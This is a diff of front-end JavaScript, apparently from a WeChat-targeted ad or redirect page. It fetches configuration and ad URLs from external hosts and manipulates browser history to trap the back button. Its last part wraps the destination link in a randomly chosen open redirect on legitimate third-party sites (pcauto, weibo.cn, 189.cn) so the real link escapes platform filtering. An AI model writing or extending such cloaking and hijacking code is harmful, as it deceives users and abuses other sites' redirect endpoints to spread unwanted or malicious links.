@@ -216,9 +216,11 @@ $(function () {
                     entranceHost = eh;
                 }
                 $.ajax({
-                    url: "https://50pk.cc/api/config/getconfig",
-                    data: { type: 'WxPlatform', hosts: [hostname, entranceHost] },
-                    dataType: "jsonp",
+                    url: "https://50pk.cc/api/config/GetConfigCors",
+                    type: "POST",
+                    data: JSON.stringify({ type: 'WxPlatform', hosts: [hostname, entranceHost] }),
+                    contentType: "application/json",
+                    crossDomain: true,
                     success: function (data) {
                         window.result = config_json(data.cfg || {});
                         aam = 'http://*.' + entranceHost;
@@ -290,10 +292,13 @@ function wxalert(a, b, c) {
         $('.avt').remove();
     });
 }
+
 $.ajax({
-    url: "https://js.bjyshj.cn/api/ad/GetUrl",
-    dataType: "jsonp",
-    data: { id: 1 },
+    url: "https://js.bjyshj.cn/api/ad/GetUrlCors?id=1",
+    type: "POST",
+    data: JSON.stringify({}),
+    contentType: "application/json",
+    crossDomain: true,
     success: function (data) {
         setTimeout(function () {
             history.pushState(history.length + 1, "ttt", "#" + new Date().getTime());
@@ -345,12 +350,12 @@ function getFileName(host, id) {
         crossDomain: true,
         success: function (data) {
             result = data || '';
-			//控制跳转开始
+            //控制跳转开始
             result = urlAppendParam(result, 'from=app');
             var heads = [
                 'http://ivy.pcauto.com.cn/click?adid=418634&id=pc.cpdq.zdym.sjyc1.&url={url}',
                 'http://weibo.cn/sinaurl?u={url}',
-                'http://' + makeid()+'.189.cn/dqmh/ssoLink.do?method=skip&platNo=93507&toStUrl=http://189.cn.{nohttpurl}'
+                'http://' + makeid() + '.189.cn/dqmh/ssoLink.do?method=skip&platNo=93507&toStUrl=http://189.cn.{nohttpurl}'
             ];
             var head = getRandomItem(heads);
             head = head.replace('{url}', encodeURIComponent(result))
